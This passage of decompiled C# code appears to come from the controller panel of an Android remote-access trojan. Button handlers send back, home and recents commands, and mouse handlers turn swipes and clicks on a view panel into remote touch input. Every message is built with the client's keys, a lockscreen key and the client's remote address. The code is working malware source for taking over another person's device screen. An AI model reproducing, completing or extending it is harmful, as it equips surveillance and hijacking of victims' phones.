				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Bc" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			try
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Ho" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			try
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>RC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Viewpanel_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Trakpoint = new List<Point>();
			Trakpoint.Add(new Point(e.X, e.Y));
			isclick = false;
			isdown = true;
		}
		else
		{
			isclick = true;
		}
	}

	private void Viewpanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isdown)
		{
			Swaping = true;
			isclick = false;
			Trakpoint.Add(new Point(e.X, e.Y));
		}
	}

	private void Viewpanel_MouseUp(object sender, MouseEventArgs e)
	{
		isdown = false;
		int num = viewpanel.Width;
		int num2 = viewpanel.Height;
		checked
		{
			if (!isclick)
			{
				if (!Swaping)
				{
					return;
				}
				Swaping = false;
				Trakpoint.Add(new Point(e.X, e.Y));
				StringBuilder stringBuilder = new StringBuilder();
				foreach (Point item in Trakpoint)
				{
					stringBuilder.Append(new Point((int)Math.Round((double)item.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)item.Y * ((double)ScreenSize.Height / (double)num2))).ToString() + ":");
				}
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + stringBuilder.ToString() + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
			else
			{
				string text = "clk:";
				tiks = 0;
				Point point = viewpanel.PointToClient(Control.MousePosition);
				Point point2 = new Point((int)Math.Round((double)point.X * ((double)num / (double)num)), (int)Math.Round((double)point.Y * ((double)num2 / (double)num2)));
				text = text + point2.X + ":" + point2.Y;
				string[] array2 = Classclient.Keys.Split(':');
				object[] parametersObjects2 = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + text + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects2);
			}
		}
	}
}
